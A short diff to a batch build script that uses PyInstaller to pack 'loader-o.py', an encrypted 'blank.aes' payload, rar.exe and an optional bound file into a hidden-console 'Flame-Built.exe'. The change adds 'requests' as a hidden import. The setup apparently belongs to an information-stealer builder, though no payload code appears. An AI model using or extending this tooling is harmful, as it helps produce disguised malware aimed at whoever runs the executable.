@@ -29,7 +29,7 @@ title Converting to exe...
 if exist "bound.blank" (set "bound=--add-data bound.blank;.") else (set "bound=")
 if exist "noconsole" (set "mode=--noconsole") else (set "mode=--console")
 if exist "icon.ico" (set "icon=icon.ico") else (set "icon=NONE")
-pyinstaller %mode% --onefile --clean --noconfirm loader-o.py --name "Flame-Built.exe" -i %icon% --hidden-import urllib3 --hidden-import sqlite3 --hidden-import pyaes --hidden-import ctypes --hidden-import ctypes.wintypes --hidden-import json --add-binary rar.exe;. --add-data rarreg.key;. --add-data blank.aes;. --version-file version.txt %bound%
+pyinstaller %mode% --onefile --clean --noconfirm loader-o.py --name "Flame-Built.exe" -i %icon% --hidden-import urllib3 --hidden-import requests --hidden-import sqlite3 --hidden-import pyaes --hidden-import ctypes --hidden-import ctypes.wintypes --hidden-import json --add-binary rar.exe;. --add-data rarreg.key;. --add-data blank.aes;. --version-file version.txt %bound%
 if %errorlevel%==0 (
     cls
     title Post processing...
